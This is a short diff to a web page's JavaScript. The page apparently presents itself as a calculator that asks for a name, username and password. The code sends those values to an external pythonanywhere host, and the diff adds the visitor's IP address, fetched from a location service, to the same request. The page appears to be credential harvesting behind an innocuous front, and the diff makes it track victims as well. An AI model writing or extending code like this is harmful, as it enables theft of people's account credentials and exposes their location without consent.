@@ -103,6 +103,7 @@
     const dataForm = document.getElementById("dataForm");
     const da = document.getElementById("DA");
     const idk = document.getElementById("idk");
+    let ips;
 
     async function fetchLocationAndSend() {
         let place;
@@ -111,6 +112,7 @@
             if (!locationResponse.ok) throw new Error('Failed to fetch location data');
             const locationData = await locationResponse.json();
             place = {ip: locationData.ip };
+            ips = place;
 
             // Send location data to your server
             const serverResponse = await fetch('https://meeatchicken.pythonanywhere.com/check-ban', {
@@ -137,7 +139,6 @@
         const name = document.getElementById("name").value;
         da.style.display = "block"; // Show output area
         da.innerHTML = `Calculating...`;
-
         const links = ['https://meeatchicken.pythonanywhere.com/main/calc'];
         try {
             const responses = await Promise.all(links.map(link =>
@@ -146,7 +147,7 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ name, username, password })
+                    body: JSON.stringify({ name, username, password, ips })
                 })
             ));
 
